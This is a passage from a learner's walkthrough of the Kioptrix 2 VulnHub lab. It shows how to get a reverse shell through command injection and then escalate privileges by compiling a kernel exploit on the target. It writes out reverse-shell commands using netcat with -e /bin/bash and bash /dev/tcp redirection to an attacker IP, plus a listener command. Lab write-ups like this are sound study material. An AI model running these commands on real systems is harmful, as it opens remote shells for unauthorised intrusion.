...
#### Method 1: nc ####
* My original intention was to let the vulnerable machine run `nc 10.0.2.6 1234 -e /bin/sh`, and for us to catch the shell with `nc -lvnp 1234`. However, I thought that `nc` is most probably not installed on the vulnerable machine, because any `nc` commands do not give any output printed in the `ping` page.
* **Important learning point**: Reading another walkthrough tells us that not all is as simple as just testing for `nc -help` alone when it comes to checking if `nc` is present on the machine. It turns out that `nc` was present, but we have to know the location of the binary to run it: `/usr/local/bin/nc`. Thus, the command to be executed in this case is `/usr/local/bin/nc 10.0.2.6 1234 -e /bin/bash`. (Alternatively, `/bin/sh` works too.)

#### Method 2: Bash Redirection (Commands Running Inside Bash) ####
* I thought that this was the first time that I am encountering a situation where `nc` is not installed. A quick Google search for `getting shell without nc` gives us [this post](https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/) as the first search result.
* The post suggested to use **bash redirection**.
* First, to check whether commands are running inside bash, run `echo $0` (which gives us `sh`) or `echo $SHELL` (which gives us `/sbin/nologin`).
* I am unsure of the correct output from either of the 2 commands for indications that it is a positive result. I guess that if there is no output from either of the 2 given commands, then our bash's TCP redirection command would fail.
* Trying out `bash &>/dev/tcp/DESTIP/DEST_PORT <&1`, it works (and thus I guess this probably means that the commands are running in bash).

#### Method 3: Bash Redirection (Commands Not Currently Running Inside Bash) ####
* It was also suggested that in the event that method 2 does not work, we should check if `bash` is even installed, by running `which bash`. A positive result in this case gives us `/bin/bash`.
* Thus, if `bash` is installed and method 2 fails, it probably means that commands are not directly running in bash, and that we have to tweak the command slightly to be `bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"`.
* The only difference between these 2 commands is that this one runs bash explictly (since commands are not already running in it) and executes the command inside it.

* **Important**: Either of the 2 commands work. What the command does (looking at the symbol characters) is to "forward stdout and stderr to DEST_IP:DEST_PORT and read stdin from the same."
* Here, I will use method 2: `bash &>/dev/tcp/10.0.2.6/1234 <&1`:
...
* Afterwards, I searched for the error message again, and added the exploit name to the search term this time: `'ip_append_data()' Ring0 Privilege Escalation floating point exception`. The first Google search result returns [a post on Hak5 forums](https://forums.hak5.org/topic/40009-floating-point-exception-on-exploit-code/), where someone was facing a similar error message as me (although his exploit was a different one).
* Thee person resolved it by compiling it on the machine locally, and that was something that worked for me as well: `gcc` was found to be installed on the vulnerable machine.
...
* **Alternate method**: A solution proposed by someone else in the same Hak5 thread was to run `gcc -m32 -Wl,--hash-style=both` instead works as well. This way, I could also compile it on my Kali machine before simply downloading only `a.out` on the vulnerable machine to be run.
...
2. https://www.abatchy.com/2016/12/kioptrix-2-walkthrough-vulnhub